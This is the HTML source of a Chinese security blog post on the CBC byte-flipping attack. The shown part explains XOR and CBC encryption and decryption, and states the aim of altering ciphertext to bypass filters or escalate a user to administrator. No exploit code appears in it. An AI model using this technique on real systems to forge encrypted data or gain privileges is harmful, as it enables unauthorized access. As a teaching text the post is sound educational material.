@@ -1,0 +1,812 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="KaynZ" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      CBC Byte Flipping Attack 
+      
+      
+      |
+    
+     L0ki&#39;s Website
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.1.1"><link rel="alternate" href="/atom.xml" title="L0ki's Website" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img no-lazy src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">L0ki</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+        <li class="nav-item" data-path="/projects/">
+          <a href="/projects/">Projects</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">CBC Byte Flipping Attack</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2024-04-21 02:07:42
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/Vulnerabilities/" title="Vulnerabilities">
+                    #Vulnerabilities
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="0x01-什么是CBC字节翻转"><a href="#0x01-什么是CBC字节翻转" class="headerlink" title="0x01 什么是CBC字节翻转"></a>0x01 什么是CBC字节翻转</h2><blockquote>
+<p><strong>通过损坏密文字节来改变明文字节</strong>。（注：借助CBC内部的模式）借由此可以绕过过滤器，或者改变用户权限提升至管理员，又或者改变应用程序预期明文以尽猥琐之事。</p>
+</blockquote>
+<p>CBC全称Cipher Block Chaining模式（密文分组链接模式），“分组“是指加密和解密过程都是以分组进行的。</p>
+<p>每一个分组大小为128bits(16字节)，如果明文的长度不是16字节的整数倍，需要对最后一个分组进行填充(padding)，使得最后一个分组长度为16字节。</p>
+<p>“链接”是指密文分组分组像链条一样相互连接在一起。</p>
+<h2 id="0x02-异或运算（XOR）"><a href="#0x02-异或运算（XOR）" class="headerlink" title="0x02 异或运算（XOR）"></a>0x02 异或运算（XOR）</h2><p>计算机存储的数据是以二进制的格式存入的，把两段二进制数字进行异或运算的话，相同的得0，不同的得1，例如:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0101</span> XOR <span class="number">0110</span> = <span class="number">0011</span></span><br><span class="line"><span class="number">65</span> XOR <span class="number">42</span> = <span class="number">107</span>(十进制数先转为二进制再进行异或操作）</span><br></pre></td></tr></table></figure>
+
+<p>字符在计算机中有对应的&#96;&#96;ascii <code>码值，对字符进行异或运算就是将两串字符对应的ascii码值相异或把得到的</code>ascii&#96;码值对应的字符相异或，异或运算具有可逆性，如</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">65</span> XOR <span class="number">42</span> = <span class="number">107</span> 则 <span class="number">107</span> XOR <span class="number">42</span> = <span class="number">65</span></span><br></pre></td></tr></table></figure>
+
+<p>因此对于异或运算 <code>a XOR b = c</code>，我们只需知道&#96;&#96;abc <code>中的任意两个，将这两个相异或便可求出第三个，这个性质也是我们进行</code>padding oracle attack&#96;的关键。</p>
+<blockquote>
+<p>当我们的一个值C是由A和B异或得到<br>C &#x3D; A XOR B<br>那么<br>A XOR B XOR C很明显是&#x3D;0的<br>当我们知道B和C之后，想要得到A的值也很容易<br>A &#x3D; B XOR C<br>因此，A XOR B XOR C等于0。</p>
+<p>有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，即可改变。</p>
+</blockquote>
+<h2 id="0x03-CBC加密模式"><a href="#0x03-CBC加密模式" class="headerlink" title="0x03 CBC加密模式"></a>0x03 CBC加密模式</h2><p><strong>简述</strong></p>
+<p>CBC是一种加密的模式，经常把DES或者AES算法（两种分组密码算法）作为加密使用的算法。</p>
+<p>所谓分组加密顾名思义，就是按一定规则把明文分成一块一块的小组，DES分组长度是八字节而AES分组长度是十六字节，每组长度一致，加密时是按组进行加密的。</p>
+<p>加密时，第一个明文分组，需要通过和IV(初始化向量)进行异或处理之后，才可以进行加密处理</p>
+<p>每一个明文分组(除了第一个明文分组)加密之前都需要和前一个密文分组进行异或处理之后，才可以进行加密处理</p>
+<h3 id="3-1-加密公式"><a href="#3-1-加密公式" class="headerlink" title="3.1 加密公式"></a>3.1 加密公式</h3><p><strong>高数公式:</strong></p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200621200245404.png" alt="image-20200621200245404"></p>
+<p><strong>民间自创:</strong></p>
+<ul>
+<li>*Ciphertext-0 &#x3D; Encrypt(Plaintext XOR IV)*—只用于第一个组块</li>
+<li>*Ciphertext-N&#x3D; Encrypt(Plaintext XOR Ciphertext-N-1)*—用于第二及剩下的组块</li>
+</ul>
+<h3 id="3-2-加密过程"><a href="#3-2-加密过程" class="headerlink" title="3.2 加密过程"></a>3.2 加密过程</h3><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200621195511411.png" alt="image-20200621195511411"></p>
+<ul>
+<li><strong>Plaintext</strong>：待加密的数据。</li>
+<li><strong>IV</strong>：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。</li>
+<li><strong>Key</strong>：被一些如AES的对称加密算法使用。</li>
+<li><strong>Ciphertext</strong>：加密后的数据。</li>
+</ul>
+<p><strong>过程</strong></p>
+<ul>
+<li>将明文的第一个分组与IV进行异或，送入加密模块进行加密，得到第一个密文分组</li>
+<li>从第二个明文分组开始，将明文分组与前一个密文分组进行异或</li>
+<li>将第2步得到的结果送入加密模块进行加密</li>
+<li>将每一个密文分组拼接起来形成密文</li>
+</ul>
+<p><strong>理解</strong></p>
+<ul>
+<li>首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。</li>
+<li>生成一个随机的初始化向量(IV)和一个密钥。</li>
+<li>将IV和第一组明文异或。</li>
+<li>用密钥对3中xor后产生的密文加密。</li>
+<li>用4中产生的密文对第二组明文进行xor操作。</li>
+<li>用密钥对5中产生的密文加密。</li>
+<li>重复4-7，到最后一组明文。</li>
+<li>将IV和加密后的密文拼接在一起，得到最终的密文。</li>
+</ul>
+<p><strong>特性</strong></p>
+<p>从第一块开始，首先与一个初始向量iv异或（iv只在第一处作用），然后把异或的结果配合key进行加密，得到第一块的密文，并且把加密的结果与下一块的明文进行异或，一直这样进行下去。因此这种模式最重要的特点就是：</p>
+<blockquote>
+<p>CBC工作于一个固定长度的比特组，将其称之为<em>块</em>。</p>
+<p><em><strong>前一块的密文用来产生后一块的密文。</strong></em></p>
+</blockquote>
+<p><strong>总述</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>对明文进行分组，使每组长度相同（通常为 <span class="number">8</span> 或 <span class="number">16</span> 字节，取决于加密算法），对长度不足的分组进行填充，通常，填充遵循的是 PKCS#<span class="number">5</span> 标准，即填充的字符即为需要填充的字符的个数（十六进制表示）</span><br><span class="line"><span class="number">2.</span>随机生成一个 Initialization Vector（IV），将第一个明文分组与 IV 作异或运算</span><br><span class="line"><span class="number">3.</span>将 <span class="number">2</span> 的结果进行加密，得到第一个明文分组的密文</span><br><span class="line"><span class="number">4.</span>从第二个明文分组开始，先将明文分组与上一组的密文作异或运算，再将结果进行加密，得到该分组的密文</span><br><span class="line"><span class="number">5.</span>将IV和这n块密文连在一起便得到了明文用CBC模式加密后的密文。</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-CBC解密模式"><a href="#0x04-CBC解密模式" class="headerlink" title="0x04 CBC解密模式"></a>0x04 CBC解密模式</h2><p><strong>简述</strong></p>
+<p>第一个密文分组，解密之后，需要通过和IV进行异或处理，才可以得到第一个明文分组</p>
+<p>每一个密文分组（除第一个密文分组外）经过解密处理之后，都需要和前一个密文分组进行异或处理，才可以得到对应的明文分组</p>
+<h3 id="4-1-解密公式"><a href="#4-1-解密公式" class="headerlink" title="4.1 解密公式"></a>4.1 解密公式</h3><p><strong>高数公式:</strong></p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200621201243451.png" alt="image-20200621201243451"></p>
+<p><strong>民间自创:</strong></p>
+<blockquote>
+<p><strong>Ciphertext-N-1（密文-N-1）是用来产生下一块明文</strong>；这就是字节翻转攻击开始发挥作用的地方。</p>
+<p>如果我们改变<em>Ciphertext-N-1</em>（密文-N-1）的一个字节，然后与下一个解密后的组块异或，我们就可以得到一个不同的明文了！</p>
+</blockquote>
+<ul>
+<li><em>Plaintext-0 &#x3D; Decrypt(Ciphertext) XOR IV</em>—只用于第一个组块</li>
+<li><em>Plaintext-N&#x3D; Decrypt(Ciphertext) XOR Ciphertext-N-1</em>—用于第二及剩下的组块</li>
+</ul>
+<h3 id="4-2-解密过程"><a href="#4-2-解密过程" class="headerlink" title="4.2 解密过程"></a>4.2 解密过程</h3><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200621200547217.png" alt="image-20200621200547217"></p>
+<ul>
+<li><strong>Plaintext</strong>：待加密的数据。</li>
+<li><strong>IV</strong>：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。</li>
+<li><strong>Key</strong>：被一些如AES的对称加密算法使用。</li>
+<li><strong>Ciphertext</strong>：加密后的数据。</li>
+</ul>
+<p><strong>过程</strong></p>
+<ul>
+<li>将密文的第一个分组进行解密，得到的结果与IV进行异或处理，得到第一个明文分组。</li>
+<li>从第二个密文分组开始，先对每一个密文分组进行解密处理，到第3步。</li>
+<li>将第2步得到的结果与前一个密文分组进行异或处理，得到对应的明文分组。</li>
+<li>将每一个明文分组拼接在一块，便得到原先的明文。</li>
+</ul>
+<p><strong>理解</strong></p>
+<ul>
+<li>从密文中提取出IV，然后将密文分组。</li>
+<li>使用密钥对第一组的密文解密，然后和IV进行xor得到明文。</li>
+<li>使用密钥对第二组密文解密，然后和2中的密文xor得到明文。</li>
+<li>重复2-3，直到最后一组密文。</li>
+</ul>
+<p><strong>特性</strong></p>
+<p>解密过程，解密的过程其实只要理解了加密，反过来看解密过程就也很简单了，同样的：</p>
+<blockquote>
+<p>CBC工作于一个固定长度的比特组，将其称之为<em>块</em>。</p>
+<p><em><strong>前一块密文参与下一块密文的还原</strong></em>。</p>
+</blockquote>
+<p><strong>总述</strong></p>
